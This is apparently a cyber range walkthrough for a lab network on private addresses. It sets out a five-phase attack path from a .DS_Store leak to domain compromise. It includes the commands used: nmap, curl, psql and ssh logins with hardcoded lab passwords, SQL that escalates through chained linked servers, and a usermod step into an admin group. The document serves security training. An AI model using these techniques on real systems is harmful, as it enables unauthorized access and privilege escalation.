# P.O.O. Cyber Range - Attack Guide

## Network Layout
- **Attacker**: 10.13.38.5
- **Web Server**: 10.13.38.11 (Port 80)
- **Database**: 10.13.38.12 (Port 5432)
- **Internal/DC**: 10.13.38.13 (Port 22)

## Attack Path Overview

### Phase 1: Reconnaissance
1. Port scan the network
2. Enumerate web server
3. Find .DS_Store file leak

### Phase 2: Initial Access
1. Parse .DS_Store to find hidden directories
2. Discover /dev folder with database credentials
3. Connect to PostgreSQL with found credentials

### Phase 3: Privilege Escalation (Database)
1. Enumerate linked servers (Foreign Data Wrappers)
2. Discover circular link vulnerability
3. Escalate to superuser via linked server chain

### Phase 4: Lateral Movement
1. Use database superuser to execute commands
2. Find SSH credentials in config table
3. SSH to internal server as p00_adm

### Phase 5: Domain Compromise
1. Exploit p00_adm's GenericAll privileges
2. Add yourself to domainadmins group
3. Access final flag

## Flags
1. **Flag 1**: Hidden in /dev/.../db/poo_connection.txt
2. **Flag 2**: In database 'flag' table
3. **Flag 3**: Admin panel after login
4. **Flag 4**: webadmin Desktop
5. **Flag 5**: mr3ks Desktop (Domain Admin)

## Commands

### Nmap Scan
```bash
nmap -sV -sC 10.13.38.11-13
```

### Fetch DS_Store
```bash
curl http://10.13.38.11/.DS_Store
python3 /tools/ds_store_parser.py http://10.13.38.11
```

### PostgreSQL Connection
```bash
psql -h 10.13.38.12 -U external_user -d poo_public
# Password: #p00Public3xt3rnalUs3r#
```

### SQL Queries for Enumeration
```sql
-- Check current user
SELECT current_user;

-- List linked servers
SELECT srvname FROM pg_foreign_server;

-- Execute on linked server
SELECT * FROM exec_on_config('SELECT current_user');

-- Exploit circular link (escalate to postgres)
SELECT * FROM exec_on_config('SELECT * FROM exec_on_public_as_sa(''SELECT current_user'')');

-- Read flag after escalation
SELECT * FROM exec_on_config('SELECT * FROM exec_on_public_as_sa(''SELECT * FROM dblink(''''dbname=flag'''', ''''SELECT * FROM flag'''') AS t(flag TEXT)'')');
```

### SSH to Internal
```bash
ssh p00_adm@10.13.38.13
# Password: ZQ5t4r
```

### Domain Privilege Escalation
```bash
# As p00_adm, add yourself to domainadmins
sudo usermod -aG domainadmins p00_adm

# Verify
id p00_adm

# Access flag
cat /home/mr3ks/Desktop/flag.txt
```
